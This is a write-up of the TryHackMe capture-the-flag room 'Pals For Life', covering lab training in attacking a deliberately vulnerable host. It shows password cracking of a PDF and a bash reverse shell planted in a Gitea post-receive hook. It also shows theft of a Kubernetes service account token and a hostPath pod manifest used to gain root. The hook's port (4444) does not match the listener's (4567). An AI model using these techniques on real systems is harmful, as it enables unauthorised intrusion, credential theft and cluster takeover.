# Pals For Life

This is my writeup for the TryHackMe room [Pals For Life](https://tryhackme.com/room/palsforlife) created by [ttauveron](https://tryhackme.com/p/ttauveron).

![image](https://user-images.githubusercontent.com/86648102/134854878-900bff84-6396-4adf-a4dc-4bc04a99152c.png)

---

## Task 1 Deploy the VM

Please allow 5 minutes for the machine to fully boot up.

> Answer: No answer needed

## Task 2 Compromise the machine

**Answer the questions below**

### Flag 1

`export ip=10.10.219.14`

`ping $ip`

- Get machine IP and check the connectivity:

![image](https://user-images.githubusercontent.com/86648102/134903424-aebdd489-9e4f-4471-b155-6eeade692bc6.png)
- Scanning and Enumeration:
`sudo nmap -sC -sV -v -oN PalsForLifenmapscan.txt $ip -p- -Pn`

Open ports:
- 22 ssh
- 6443 ssl/sun-sr-https? Kubernetes
- 10250 Golang net/http server
- 30180 nginx
- 31111 Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go
- 31112 OpenSSH

---
- For now, we leave the SSH ports alone. The most interesting, in my oppinion is the Gitea 31111 port.

![image](https://user-images.githubusercontent.com/86648102/134904400-5e3ce142-048b-43c0-a60f-170e9f45d32a.png)

- Let's explore the website. Under **Explore** > **Users** we manage to find the following:
![image](https://user-images.githubusercontent.com/86648102/134904776-cd8e3428-448e-430e-8c58-e69f489facbb.png)

We have a user: leeroy.

---

- I tried scanning the other ports with Gobuster, to see if other pages are around there. The 30180 returned something interesting!

`sudo gobuster dir -u http://$ip:30180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee palsforlifegobuster.txt`

![image](https://user-images.githubusercontent.com/86648102/134906394-ffd3def6-6fee-48b8-a87f-9e332c3d506a.png)

http://machineip:30180/team 

![image](https://user-images.githubusercontent.com/86648102/134906568-0b0dbb54-8df7-4aaf-8e81-770fda5571bf.png)

Someone seems to like World Of Warcraft a lot :)

Nothing special on the page, except the video. However, when inspecting the page:

![image](https://user-images.githubusercontent.com/86648102/134906809-ee1d0239-2d66-439e-bae9-10185e572e1c.png)

Someone forgot an "uninteresting" file around. Let's put the code in a text file and see what we can do.

![image](https://user-images.githubusercontent.com/86648102/134907151-805d81e9-74a1-4bde-98b0-c2631dfeaf8e.png)

What if we decode it with base64?

`cat contentfromsite | base64 --decode > uninteresting_file.pdf`

![image](https://user-images.githubusercontent.com/86648102/134907464-9d8b6ac1-0d8f-45ea-8f61-563b952a27c1.png)

Apparently it's password protected. We will use **John The Ripper** for this one.

`/usr/share/john/pdf2john.pl uninteresting_file.pdf > pdfhash.txt`

The format to be used will be shown with this command:

`john --list=formats | grep -i pdf`

And to crack the password of the file:

`john --format=PDF --wordlist=/usr/share/wordlists/rockyou.txt pdfhash.txt`

`john --show pdfhash.txt`

**It worked!**

![image](https://user-images.githubusercontent.com/86648102/134908157-99295585-44ac-477e-9df5-f645867be2bb.png)

Apply the password to the PDF file. Apparently, within there's a text that might look like a password...back to the Gitea, maybe **leeroy** with this password will work.

![image](https://user-images.githubusercontent.com/86648102/134908865-171c7bc2-5dc8-4f62-adb3-2076da70b2e0.png)

We are in!

- Found a "secret" field under the Webhooks ( Repository > Settings > Webhooks )
Right click to inspect the field and..you get the first flag.

![image](https://user-images.githubusercontent.com/86648102/134909821-2a88084b-8fac-45a5-a87b-e0c457dbe74c.png)

---
### Flag 2
---

Githooks abuse.

![image](https://user-images.githubusercontent.com/86648102/134910069-93f8b126-1a15-4f17-9a03-aaf134cb341f.png)

Edit the "post-receive" hook and add the following content:

`#!/bin/bash
bash -i >& /dev/tcp/10.8.174.98/4444 0>&1`

![image](https://user-images.githubusercontent.com/86648102/134910323-c2859f53-3897-449b-ab14-f31e75317abb.png)

Also, open a netcat listener on port 4567.

`sudo nc -nvlp 4567`

![image](https://user-images.githubusercontent.com/86648102/134913265-87d883c4-11b5-4db8-acfe-f309bba16147.png)

We need to do some sort of action, for the hook to activate the reverse shell. Creating a new file, will do just fine:

![image](https://user-images.githubusercontent.com/86648102/134913438-3e4cd6b8-a7ac-4ae8-a3de-1f2ddd0b46c2.png)

We got the shell.

![image](https://user-images.githubusercontent.com/86648102/134913596-3b2ebc47-d1c3-44c8-8b37-f0395568bc6a.png)

By searching for flag files, we get the 2nd flag:

`find / -type f -iname flag2* 2>/dev/null`

![image](https://user-images.githubusercontent.com/86648102/134913989-f240b007-1c98-419f-823e-e2ecfca0c505.png)

---
### Flag 3
---

As the hint says "kubectl", this one is about Kubernetes (Port 6443)

- Service Account Token

> By default, the containers in the Kubernetes cluster will hold service account token within their file system. If an attacker could find that token, he/she can use it to move laterally or depending the privilege of the service account, one can escalate its privilege to further compromise the cluster environment

`cat /var/run/secrets/kubernetes.io/serviceaccount/token`

> Output the token to a text file for later usage.

- Usage of it:

`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 auth can-i --list`

Apparently, we can do anything with it.

![image](https://user-images.githubusercontent.com/86648102/134915608-1fc9f376-8b15-4615-a423-4d2c2007f73c.png)

As, we have the permissions, let's check the secret resources:

`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'`

![image](https://user-images.githubusercontent.com/86648102/134916020-e9f9230e-c70d-4c47-8fa8-65013b5d6ec0.png)

---
### Flag 4
---

We will create a new pod and abuse this.
Create a **host.yaml**

```
apiVersion: v1
kind: Pod
metadata:
  name: host
spec:
  containers:
  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
    name: host
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

And then run the following command:
  
`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n default apply -f host.yaml`
  
`kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://$ip:6443 -n default exec -it host bash`

And with this, we are in as root:

`find / -type f -iname *root.txt* 2>/dev/null`

![image](https://user-images.githubusercontent.com/86648102/134922788-74a8e64e-266a-469a-9054-0f22f2dc7b03.png)

Last flag is here.

Congrats for making it so far. Contact me in case of further explanations are needed!

